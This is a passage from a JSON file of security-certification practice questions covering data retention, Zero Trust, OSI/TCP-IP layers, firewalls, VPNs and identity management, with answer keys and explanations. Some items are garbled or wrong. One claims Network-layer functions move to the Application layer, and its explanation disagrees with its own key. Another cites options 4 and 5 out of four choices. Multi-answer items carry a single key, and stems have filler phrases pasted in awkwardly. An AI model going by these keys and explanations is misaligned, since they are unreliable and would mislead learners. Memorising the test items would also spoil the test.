      "explanation": "Option 3 is correct in this scenario. The Data Retention Policy is usually driven by Business needs, Industrial Regulations, Litigation Needs, etc. However, the source of data does not drive the Data Retention Policy. The first step to developing the Data Retention Policy generally involves evaluation of the Business Needs, Applicable Regulations, and Litigation needs if applicable. This is generally followed by Data Classification and defining appropriate policies that define how long the data should be retained."
    },
    {
      "id": "d2-q73",
      "domain": "2. Asset Security",
      "stem": "In compliance with your Enterprise's Data Retention Policies, you have archived the logs generated in your SIEM systems. What option options can you perform on the archived data? (Select TWO)?",
      "choices": [
        "Create",
        "Read",
        "Update",
        "Delete"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 2 and 4. Options 1 and 3 are incorrect as you cannot update/create the contents after the data is archived. Once the data is archived, appropriate controls should be placed in order to make sure that the contents cannot be updated. However, the read and deletion of data (B and D, respectively) are permitted based on the Organization's Retention Policy and are therefore the correct answer options for this question. The NIST Special Publication 800-92, \"Guide to Computer Security Log Management\" establishes guidelines and recommendations for securing and managing sensitive log data. NIST SP 800-92 defines a log management infrastructure as having 4 major functions: 1. General - log parsing, event filtering, and event aggregation. 2. Log Storage - rotation, archival, compression, reduction, normalization, integrity checking. 3. Log Analysis - event correlation, viewing, and reporting. 4. Disposal – clearing."
    },
    {
      "id": "d2-q74",
      "domain": "2. Asset Security",
      "stem": "After a control-gap review, you are appointed as a SOC lead in a bank where you will be responsible for operations and maintenance of the Information Technology (IT) Department's resources. What option roles suites your profile the most?",
      "choices": [
        "Custodian",
        "Data Owner",
        "System Owner",
        "Administrator"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Data Custodians are responsible for operations and maintenance activities like daily upkeep and backups. They are responsible for the safe custody, transport, and storage of the data and implementation of business rules. A Data Owner (typically a member of the management team) is responsible for determining roles and responsibilities, classifying, and authorizing data. They may delegate tasks to the data steward, data custodian, or other roles. A System Owner is responsible for ensuring that data processed on the system remains secure. This includes identifying the highest level of data that the system processes. They then ensure that the system is labeled accurately and that appropriate security controls are in place to protect the data. Administrators are generally responsible for provisioning accounts and relevant access to the end-users."
    },
    {
      "id": "d2-q75",
      "domain": "2. Asset Security",
      "stem": "Your organization provides critical services to many other enterprises including Federal Agencies, Hospitals, Banks, etc, and manages the Personally Identifiable Information (PII) of the clients/users of those enterprises. What option compliance requirements apply to your enterprise?",
      "choices": [
        "Federal Regulatory Compliance as it is the most strict",
        "Regulatory Compliance applied to Financial Institutions",
        "HIPAA as it includes both Security and Privacy Compliances",
        "All of the above and any other applicable regulatory Compliances, including local laws"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The organization that handles data of different industries must be in compliance with all the applicable Standards and Regulations applied to that organization. These are also defined in the client agreements and the vendor/service provider must follow the standards defined by the Regulations. Along with the Industrial Regulations, the organization has to abide by the local laws and regulations applied to them."
    },
    {
      "id": "d2-q76",
      "domain": "2. Asset Security",
      "stem": "During a security governance meeting, following Asset Identification and Data Classification, what is the next step in identifying what you need to protect?",
      "choices": [
        "Configure Controls based on Secure Practices",
        "Implement the Controls",
        "Use a Security Baseline to identify Controls",
        "Tailoring and Scoping"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Once an organization has identified and classified its assets, it will typically want to secure them by using the Security Baseline. Baselines provide a starting point and ensure a minimum-security standard. Generally, the Control Baseline (1) is selected based on Industry Best Practices, e.g., ISO 27002. After selecting a control baseline, organizations fine-tune it with tailoring and scoping processes (4). Scoping refers to removing the baselines that are not required based on Organization requirements. Tailoring refers to customizing the controls in the baselines. This is followed by adding compensating/missing controls (2) as suggested by the Baseline or replacing the baseline control with another control if required."
    },
    {
      "id": "d3-q88",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Based on your recent security management meeting, it is decided that your organization will move its focus to the Zero Trust Principles. What option principles applies to the concept of Zero Trust? (Select 3)?",
      "choices": [
        "Never trust, always verify",
        "Operate under the assumption of a data breach",
        "Security Parameter",
        "Least Privilege"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1, 2, and 4. Much like other kinds of digital transformations, implementing zero trust isn't a plug-and-play solution to fix the shortcomings of current cybersecurity practices. It is a total commitment to a process that alters an organization's structure. In any transformation project, there is an opportunity to reduce cybersecurity risk by applying the guiding principles of zero trust: A, Never trust, always verify: Treat every user, device, application, and data flow as untrusted. D, Authenticate and explicitly authorize each to the least privilege required using dynamic security policies. B, Operate under the assumption of a data breach: Consciously operate and defend resources with the assumption that an adversary already has a presence within an organization. Deny by default. Heavily scrutinize all users, devices, data flows, and requests for access. Log, inspect, and continuously monitor all configuration changes, resource accesses, and network traffic for suspicious activity. Verify explicitly: Access to all resources should be conducted in a consistent and secure manner using multiple attributes (dynamic and static) to derive confidence levels for contextual access decisions to resources. With the advent of Cloud Infrastructure and people working from anywhere, the concept of Security Parameter is now vague and the concept of Zero Trust is being applied to provide security against data breach."
    },
    {
      "id": "d3-q89",
      "domain": "3. Security Architecture and Engineering",
      "stem": "You work in a small organization where you find that the Senior Management has access to everything including super admin privileges to Applications, Domains, and App/Web Servers. What option Security Principles is most likely to be violated with this approach?",
      "choices": [
        "Secure Defaults",
        "Need to Know",
        "Least Privilege",
        "Zero Trust"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The principle of least privilege states that one should only have access to what they need and nothing more. In the above scenario, everyone in the Senior Management Team has access to privileges that they don't need or use in their day-to-day actions. Need to Know refers to the confidentiality of information. You don't reveal the information to anyone who does not need to know about it. For example, People from the HR department do not need to know about the Financial Reporting Application managed by the Finance Department Secure Defaults is the Security Concept which ensures that the default configuration settings of a product are the most secure settings possible. Zero Trust is a security concept centered on the belief that organizations should not automatically trust anything inside or outside their perimeters and instead must verify anything and everything trying to connect to its systems before granting access."
    },
    {
      "id": "d3-q90",
      "domain": "3. Security Architecture and Engineering",
      "stem": "After a control-gap review, what option Security Control Models defines Separation of Duties?",
      "choices": [
        "Bell LaPadula",
        "Biba",
        "Clark Wilson",
        "Brewer Nash (Chinese Wall)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The Clark-Wilson Model enforces the concept of separation of duties. Clark-Wilson features an access control triple, which is composed of the user, transformational procedure, and the constrained data item, and was designed to protect integrity. Clark-Wilson controls the way in which subjects access objects so that the internal consistency of the system can be ensured and that data can be manipulated only in ways that protect consistency."
    },
    {
      "id": "d3-q91",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In a recent internal assessment, windows BitLocker uses which concept to perform Full Disk Encryption using hardware on the motherboard that is used to store Encryption keys?",
      "choices": [
        "Read Only Memory (ROM)",
        "Unified Extensible Firmware Interface (UEFI)",
        "Basic Input/Output System (BIOS)",
        "Trusted Platform Module (TPM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Trusted Platform Module (TPM) technology is designed to provide hardware-based, security-related functions. A TPM chip is a secure crypto-processor that helps you with actions such as generating, storing, and limiting the use of cryptographic keys. Windows BitLocker uses the TPM technology to perform Full Disk Encryption."
    },
    {
      "id": "d3-q92",
      "domain": "3. Security Architecture and Engineering",
      "stem": "You developed a web scraping script that scrapes data from a website and sends you alerts whenever anything new is added to that site. You want to deploy this script on a cloud-based environment so your script runs non-stop. What option cloud-based models supports this requirement?",
      "choices": [
        "Infrastructure as a service (IaaS)",
        "Platform as a service (PaaS)",
        "Software as a service (SaaS)",
        "Cloud as a service (CaaS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Function as a service (FaaS), which is a sub-category of Platform as a service (PaaS), is a service-hosted remote procedure call that leverages serverless computing to enable the deployment of individual functions in the cloud that run in response to events. Some examples of FaaS are Heroku, AWS Elastic Beanstalk, Windows Azure, Force.com, Google App Engine, and OpenShift. Option 1 is less suitable because Infrastructure as a service is a layer of computing platform that enables clients to outsource IT infrastructures including virtual machines, storage, processing, networking, servers, and other resources on the internet through the model of pay-as-per-use. Option 3 is less suitable because Software-as-a-service refers to a model employed in software distribution where a third-party provider acts as the host of applications and avails them to clients over the internet. Option 4 is less suitable because Cloud-as-a-service refers to the usage of cloud computing services that are paid for on the basis of pay-per-use."
    },
    {
      "id": "d3-q93",
      "domain": "3. Security Architecture and Engineering",
      "stem": "As part of a risk reduction initiative, you are designing the next video streaming service, for which you need to ensure that there is no issue with Content Buffering and that the user gets the best possible viewing experience. What option architectures will you select?",
      "choices": [
        "Fog Computing",
        "CDN (Content Delivery Network)",
        "Serverless Computing",
        "Virtualized Computing"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. CDN is a Content Delivery Network or Content Distribution Network. As the name suggests, it is a network of servers distributed globally. When you hit the play button, the video displayed on your device is streamed from this component. This significantly reduces the response time as the video is streamed from the server nearest to your location. CDNs replicate content in multiple places, so there's a better chance of videos being closer to the user and with fewer hops. CDN machines make heavy use of caching and can mostly serve videos out of memory. Less popular videos that are not cached by CDNs can be served by the servers in various data centers."
    },
    {
      "id": "d3-q94",
      "domain": "3. Security Architecture and Engineering",
      "stem": "You are in the Security Management Team of the ABC Corp where you need to design the security standards for the enterprise. What option algorithms are you most likely to select?",
      "choices": [
        "SHA-1 (Secure Hash Algorithm)",
        "SHA-2 (Secure Hash Algorithm )",
        "MD-5 (Message Digest)",
        "MD-4 (Message Digest)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Algorithms like SHA-1, MD4 and MD5 have been proven as broken, so to define the secure algorithm in your organization's security standards you are most likely to select SHA-2 from the options given above."
    },
    {
      "id": "d3-q95",
      "domain": "3. Security Architecture and Engineering",
      "stem": "During a security governance meeting, in your development environment, you mostly use Self-Signed Certificates to test the TLS features of the in-built applications. What is the reason why the usage of Self-Signed Certificates is discouraged?",
      "choices": [
        "Self-Signed Certificates do not have public keys",
        "Self-Signed Certificates cannot be used in TLS",
        "Self-Signed Certificates do not have associated private keys",
        "Self-Signed Certificates are not trusted"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. A Self-Signed Certificate can be generated by anyone which makes them inherently not trusted by your browser because a certificate itself doesn't form any trust. This can only be the case where the certificate is signed by a trusted Certificate Authority."
    },
    {
      "id": "d4-q86",
      "domain": "4. Communication and Network Security",
      "stem": "The Open System Interconnect (OSI) model defines 7 network layers. However, in the current network infrastructure (TCP/IP Model), some of the layers are either not required or their functions are managed by other layer(s). What option layers is NOT a part of the application layer in the TCP/IP Model as compared to the described OSI Layers?",
      "choices": [
        "Application",
        "Presentation",
        "Network",
        "Session"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. The Network Layer is not present in the current TCP/IP network model as its functions are provided by the Application Layer. Operations like Data compression, Encryption, and more are handled by the Application Layer."
    },
    {
      "id": "d4-q87",
      "domain": "4. Communication and Network Security",
      "stem": "In a recent internal assessment, while analyzing the network packets during encapsulation in the OSI model, you observe that there are a few layers that add trailer in addition to the headers added by the other network layers. What option OSI layers add trailers to the received payload? Select all anwers that apply?",
      "choices": [
        "Data link",
        "Application",
        "Transport",
        "Network"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 4 and 5. In the OSI Model, the Physical and Data Link layers add footers."
    },
    {
      "id": "d4-q88",
      "domain": "4. Communication and Network Security",
      "stem": "Your organization wants to adopt IPv6. Given that not all your enterprise's existing network equipment currently supports it, which of the following options is FALSE with respect to the adoption of IPv6 (Internet Protocol)?",
      "choices": [
        "IPv6 uses 128 bits addressing",
        "IPv6 and IPv4 can co-exist on the same network",
        "With IPv6, Domain Name Service (DNS) is no longer required",
        "With IPv6, Network Address Translation (NAT) is no longer required"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. DNS is still required for IPv6. The Domain Name System (DNS) is the phonebook of the Internet. Humans access information online through domain names, like \"nytimes.com\" or \"espn.com\". Web browsers interact through Internet Protocol (IP) addresses. DNS translates domain names to IP addresses so browsers can load Internet resources. IPv6 is the future of the Internet as IPv4 addresses are limited and are not intrinsically secure. IPv6 uses 128-bit addressing (1) instead of the 32-bit addresses in IPv4. IPv6 offers many new features that are not available in IPv4. Some of IPv6's new features are scoped addresses, autoconfiguration, and quality of service (QoS) priority values. IPv6 and IPv4 can coexist on the same network (2) using one or more of three primary options: dual-stack, tunneling, or NAT-PT.With IPv6's autoconfiguration feature, NAT and DHCP are not required (4)."
    },
    {
      "id": "d4-q89",
      "domain": "4. Communication and Network Security",
      "stem": "Network Segmentation is employed in most network architectures, as this provides more security and manageability for network devices and systems. What option is not a benefit of using Micro-Segmentation?",
      "choices": [
        "Reduced network configurations",
        "Containing network problems",
        "Reduced congestion",
        "Improved Access Control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Reduced network configurations are not an advantage of Network Segmentation. Network segmentation in computer networking is the act or practice of splitting a computer network into subnetworks, each being a network segment. The advantages of such splitting are primarily for boosting performance and improving security. The advantages of Network Segmentation are (1) Reduced congestion, which improves performance by reducing the number of hosts per subnetwork and minizes local traffic. Thus, option 3 is incorrect; (2) Improved security, by containing broadcasts to the local network so that the internal network structure is not visible from the outside. By creating network segments containing only the resources specific to the consumers that you authorize access to, you are creating an environment of least privilege; (3) Containing network problems, limiting the effect of local failures on other parts of the network. Thus, option 3 is incorrect; and (4) Improved Access Control, since visitor access to the network can be controlled by implementing VLANs to segregate the network. Option 4 is therefore incorrect."
    },
    {
      "id": "d4-q90",
      "domain": "4. Communication and Network Security",
      "stem": "As part of a risk reduction initiative, during a recent network attack, you found out that the existing firewall configuration allowed access to the server (10.1.1.19). What option firewall rules did not allow for web access to the server?",
      "choices": [
        "DENY IP 10.1.1.19 80 PERMIT IP ANY ANY",
        "PERMIT IP ANY ANY DENY IP 10.1.1.19 21",
        "DENY IP 10.1.1.19 443 PERMIT IP ANY ANY",
        "DENY IP 10.1.1.19 443 DENY IP 10.1.1.19 80 PERMIT IP ANY ANY"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The Firewall Rules should have explicit DENY rules specified before general Permit rules are listed. Option 4 denies both HTTP and HTTPS access to the server. In all the other options there is a way to access the server via HTTP (3), HTTPS (1). Option 2 allows all the traffic which allows access to the server too."
    },
    {
      "id": "d4-q91",
      "domain": "4. Communication and Network Security",
      "stem": "Your Enterprise has defined clear network segmentation, restricting access from each network zone via firewalls. What option servers should not be placed on the Demilitarized Zone (DMZ) (Shared Subnet)?",
      "choices": [
        "Web Server",
        "Email Server",
        "Database Server",
        "Domain Name Server (DNS)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario., database server. DMZs are the best place for your public information. Any servers that serve users via the public internet should reside here. That way customers, potential customers, and outsiders can obtain the information that they need about your company without accessing the internal network. These servers include email (option 2), web (option 1), Domain Name Systems [DNS] (option 4), proxy, and File Transfer Protocol servers. Your confidential and proprietary company information should be stored behind your DMZ on your internal network. Servers on the DMZ shouldn't contain sensitive trade secrets, source code, or proprietary information. Therefore, a server such as a database server should not be placed in a DMZ. This also protects it in case the DMZ is compromised."
    },
    {
      "id": "d4-q92",
      "domain": "4. Communication and Network Security",
      "stem": "Yao's organization has recently approved the budget for the Network Access Control Device, please select the features that do not match with the NAC capabilities?",
      "choices": [
        "Detect and Quarantine Malware affected devices",
        "Enforce security policy throughout the network",
        "Prevent/reduce known attacks directly and zero-day indirectly",
        "Use identities to perform access control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Network access control is the act of keeping unauthorized users and devices out of a private network. Organizations that give certain devices or users from outside of the organization occasional access to the network can use network access control to ensure that these devices meet corporate security compliance regulations. NAC uses identities to perform access control to Prevent/reduce known attacks directly and zero-day indirectly. It also enforces security policy throughout the network. This is crucial when the enterprise allows for BYOD, Network access for non-Employees, the use of IoT Devices, etc. Detection and Quarantine of Malware affected devices is not a feature of NAC, but instead, of Anti-Malware software."
    },
    {
      "id": "d4-q93",
      "domain": "4. Communication and Network Security",
      "stem": "In a recent internal assessment, xYZ Corp recently upgraded their network firewall infrastructure with an Application-Level Firewall. What option is NOT a common feature of this type of firewall?",
      "choices": [
        "Proxy",
        "Domain Name Server (DNS)",
        "Content Filtering",
        "URL Filtering"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. DNS service is not provided by Application-Level Firewalls. The Domain Name System is the hierarchical and decentralized naming system used to identify computers reachable through the Internet or other Internet Protocol networks. The resource records contained in the DNS associate domain names with other forms of information. Application-level gateway proxy Firewalls operate at the OSI \"application layer\" and make decisions on content. These are very slow in operation but extremely secure as they can even look for keywords in the content. They support a wide array of protocols that reside in the Application layer (Telnet, FTP, SMTP, HTTP, SNMP). Application-level firewalls are more popular than circuit-level gateway proxy firewalls. Generally, these firewalls provide features like Proxy Servers, Content Filtering, and URL Filtering."
    },
    {
      "id": "d4-q94",
      "domain": "4. Communication and Network Security",
      "stem": "What option protocols is not commonly used in Virtual Private Networks (VPN)?",
      "choices": [
        "Point-to-Point Protocol (PPP)",
        "Internet Protocol Security (IPSec)",
        "Transport Layer Security (TLS)",
        "Layer 2 Tunneling Protocol (L2TP)"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. PPP is not a protocol used in VPNs. A virtual private network (VPN) is a communication tunnel that provides point-to-point transmission of both authentication and data traffic over an intermediary untrusted network. Most VPNs use encryption to protect the encapsulated traffic, but encryption is not necessary for the connection to be considered a VPN. VPNs are most commonly associated with establishing secure communication paths through the Internet between two distant networks. VPNs can be implemented using software or hardware solutions. In either case, there are several common VPN protocols: PPTP, L2TP, SSH, OpenVPN (i.e., TLS), and IPsec. Point-to-point protocol (PPP) is a layer 2 standard protocol for sending multi-protocol datagrams over point-to-point links such as switches/routers."
    },
    {
      "id": "d4-q95",
      "domain": "4. Communication and Network Security",
      "stem": "During a security governance meeting, what option attacks is best defended against in the IPv6 (Internet Protocol) network?",
      "choices": [
        "Shoulder Surfing",
        "Sniffing",
        "Phishing",
        "Denial of Service (DoS)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario., Sniffing. IPSec encrypts the payload and protects the contents of the network transmission. Hence, if a sniffing attack is attempted on IPSec traffic, the intruder will only see the encrypted traffic, not the content."
    },
    {
      "id": "d4-q96",
      "domain": "4. Communication and Network Security",
      "stem": "Your Internet Service Provider (ISP) is reinstalling the physical wires in your area. As a result, large wire bundles and land digs around you. What option cable types is least resistant to Electro Magnetic Interference (EMI)?",
      "choices": [
        "Fibre Optic Cable",
        "Coaxial Cable",
        "Shielded Twisted Pair (STP) Cable",
        "Unshielded Twisted Pair (UTP) Cable"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. An Unshielded Twisted Pair (UTP) Cable is the least resistant to EMI as it is unshielded. Shielded Twisted Pair has shielding which protects against the EMI. Co-axial cables have insulation around the wire which protects them against EMI. Fibre Optic cables are the most resistant against EMI."
    },
    {
      "id": "d4-q97",
      "domain": "4. Communication and Network Security",
      "stem": "The Research and Development department has its network implemented separately as IPv6. However, the department needs to connect to the rest of the enterprise's network, which is implemented as IPv4. What option devices will be used between the networks?",
      "choices": [
        "Gateway",
        "Router",
        "Switch",
        "Bridge"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Gateway is a networking device that connects networks that are using different network protocols. It is a product that enables two dissimilar networks to communicate or interface with each other."
    },
    {
      "id": "d5-q86",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "After a control-gap review, every organization has multiple critical assets, and each has its own set of admin accounts. Based on the enterprise's Security Policy, each time the shared admin account is used, the password needs to be changed. What option tools is used to manage such accounts?",
      "choices": [
        "Active Directory Credential Management",
        "Identity Management System",
        "Access Management System",
        "Privileged Access Management System"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Privileged Access Management (PAM) is an information security (infosec) mechanism that safeguards identities with special access or capabilities beyond regular users. PAM systems treat privileged accounts with extra care because of the risk they pose to the technology environment. For example, should the credentials of an administrator or service account fall into the wrong hands, it could lead to the compromise of the organization's systems and confidential data."
    },
    {
      "id": "d5-q87",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a recent Phishing attempt, the attackers successfully accessed one of the systems. As the next step, they plan to gain access to other systems and escalate their privileges. What option terms best describes this activity?",
      "choices": [
        "Privilege Escalation",
        "Lateral Movement",
        "Privilege Creep",
        "Permission Aggregation"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Lateral movement refers to the techniques that a cyber-attacker uses after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets. After entering the network, the attacker maintains ongoing access by moving through the compromised environment and obtaining increased privileges using various tools. Privilege escalation (1) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Privilege creep (3) is the slow and often unsupervised process of unnecessary privileges and rights being granted to users and identities. These accounts, with privileges greater than may be necessary and documented, pose a grave risk to the enterprise. Permission Aggregation (4) is another term for Privilege creep."
    },
    {
      "id": "d5-q88",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Device authentication is a core component of a zero-trust architecture and should always be enforced in conjunction with strong user authentication. What option techniques should not be used to perform Device Authentication? (Select TWO)?",
      "choices": [
        "IP Allowlist",
        "Public Key Infrastructure",
        "Cookies",
        "Token-based Authentication"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 3. IP Address Whitelisting would not be a valid technique for Device Authentication as IP addresses are easy to spoof, are not considered a secret, and are not always static. Cookies are likewise ineffective for this. Mostly seen on the web, cookies can be used to store a device's identifiers. The problem is that cookies can be moved from one device to another. Public Key Infrastructure (2) and Token-based authentication (4) would be valid strategies for this."
    },
    {
      "id": "d5-q89",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a security governance meeting, a logistics firm supports Just-in-Time provisioning. What option is NOT a benefit of JIT?",
      "choices": [
        "Reduced Onboarding Time",
        "Reduced number of accounts",
        "Reduced number of entitlements",
        "Increased Security"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The number of entitlements is generally independent of the Identity Solution, it is dependent on the end application which is managed by the Identity Solution. JIT provisioning is a method of automating user account creation. It is generally based on an SSO solution, such that, when a new user tries to log in to an authorized app for the first time they trigger the flow of information (that's needed to create their account) from the identity provider to the app. The benefits of JIT are Reduced Onboarding Time (1), Reduced number of Accounts (2), and Increased Security (4)."
    },
    {
      "id": "d5-q90",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Your enterprise's web application allows the user to log in either directly or via major Social Media Services like Google, Facebook, Twitter, etc. (Social Login). What option protocols is most likely to be used in this scenario? (Select TWO)?",
      "choices": [
        "SAML",
        "Oauth",
        "OpenID Connect",
        "XML"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 2 and 3. Social Login is generally implemented via protocols like OAuth 2.0 and OpenID Connect. Social login, also known as social sign-in or social sign-on, uses information from social networking sites to facilitate logins on third-party applications and platforms. The process is designed to simplify sign-in and registration experiences, providing a convenient alternative to mandatory account creation."
    },
    {
      "id": "d5-q91",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a security governance meeting, an organization has implemented Role-Based Access Control, what mechanism should they incorporate so that no one has access to initiate and approve a transaction?",
      "choices": [
        "Least privilege",
        "Separation of Duty",
        "Need to Know",
        "Mandatory Leave"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Separation of Duty is the principle that no user should be given enough privileges to misuse the system on their own. For example, the person authorizing a paycheck should not also be the one who can prepare them."
    },
    {
      "id": "d5-q92",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "What option Access Control mechanisms authorizes a user dynamically?",
      "choices": [
        "Mandatory Access Control",
        "Discretionary Access Control",
        "Role-Based Access Control",
        "Attribute-Based Access Control"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Attribute-Based Access Control (ABAC) authorizes access dynamically based on the characteristics of both Subject and Object. By definition, ABAC is an access control method where subject requests to perform operations on objects are granted or denied based on the assigned attributes of the subject, assigned attributes of the object, environment conditions, and a set of policies that are specified in terms of those attributes and conditions. Other Access control mechanisms do not consider changes in Subject/Object attributes to authorize access."
    },
    {
      "id": "d5-q93",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a quarterly audit, a global payment processor has clearly defined user onboarding workflows that give every user base access to the enterprise's infrastructure, along with their specific department access. After onboarding, the user needs to request the required accesses based on their requirement, this needs to be approved. Which Access Control Model is this?",
      "choices": [
        "Role-Based Access Control",
        "Request-Based Access Control",
        "Attribute-Based Access Control",
        "Mandatory Access Control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. The described scenario is a typical Role-Based Access Control where the users are provided with birthright access along with role-based accesses (department, location, etc). In typical Role-Based Access Control implementations, once provided with the birthright accesses, the user can request for the other roles which go through the approvals before being granted (Request Based Access Control)."
    },
    {
      "id": "d5-q94",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "In a recent internal assessment, during Annual Access Review, the Manager finds that consultants previously given temporary accesses still have these accesses. What next step could be taken by the manager?",
      "choices": [
        "Delegate the action to the Manager's Manager",
        "Approve the accesses of the consultants",
        "Revoke the accesses of the consultants",
        "Confirm existing user's need for the access before taking action"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Before taking any action, the Manager should connect with the team members (existing consultants) to determine whether they still require access or not. Based on the response, the Manager should take the appropriate action on whether to approve or revoke."
    },
    {
      "id": "d5-q95",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "After implementing the Identity Management Solution for their employees, an organization now wants to manage Service Accounts via their IAM system. In the Identity Management (IAM) system, the Service Accounts should be associated with which of the managed identities?",
      "choices": [
        "Application Owner's Identity",
        "Separate Identities for Service Account",
        "Service Owner's Identity",
        "Service Administrator's Identity"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Service Accounts should be assigned to a separate Service Identity rather than any individual's identity. The reason for that is in case any of the individual's identities get terminated, deprovisioned, or transferred. The associated Service accounts need to be reassigned to another identity which will make the Service Account management difficult."
    },
    {
      "id": "d5-q96",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Business A performed the 3rd party audit for organization B and found that several application accounts were still active even though the associated identity had been terminated. What is the best control to handle this situation?",
      "choices": [
        "Closed loop automated application Integration with IAM system",
        "Periodic recertification of access",
        "Automated provisioning/de-provisioning of managed identities",
        "Role-based access control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. The most likely reason for unmanaged accounts on the end application is either the application is managed manually or partially. With Closed-loop automated application Integration, the IAM system manages all the accounts on the application. If anyone creates an unmanaged account on the application, via periodic sync, the IAM system will detect and manage (delete) the account on the application."
    },
    {
      "id": "d5-q97",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a quarterly audit, in the Kerberos Authentication mechanism, the Key Distribution Center (KDC) requires all accounts to use pre-authentication. Pre-authentication is used to restrict which of the following attacks?",
      "choices": [
        "Sniffing",
        "Man-in-the-middle attack",
        "Password-guessing",
        "Golden Ticket"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The Key Distribution Centre (KDC) is available as part of the domain controller and performs two key functions: Authentication Service (AS) and Ticket-Granting Service (TGS) By default, the KDC requires all accounts to use pre-authentication. This is a security feature that offers protection against password-guessing attacks. The AS request identifies the client to the KDC in plain text. If pre-authentication is enabled, a timestamp will be encrypted using the user's password hash as an encryption key. If the KDC reads a valid time when using the user's password hash, which is available in the Active Directory, to decrypt the time stamp, the KDC knows that the request isn't a replay of a previous request. When you do not enforce pre-authentication, a malicious attacker can directly send a dummy request for authentication. The KDC will return an encrypted TGT and the attacker can brute force it offline."
    },
    {
      "id": "d6-q95",
      "domain": "6. Security Assessment and Testing",
      "stem": "During an Internal Audit, several issues were found in your organization and the results have been presented to Senior Management. What option decisions is least likely to be taken by Senior Management?",
      "choices": [
        "Discuss the recommendations with SMEs",
        "Take corrective action to fix the issues",
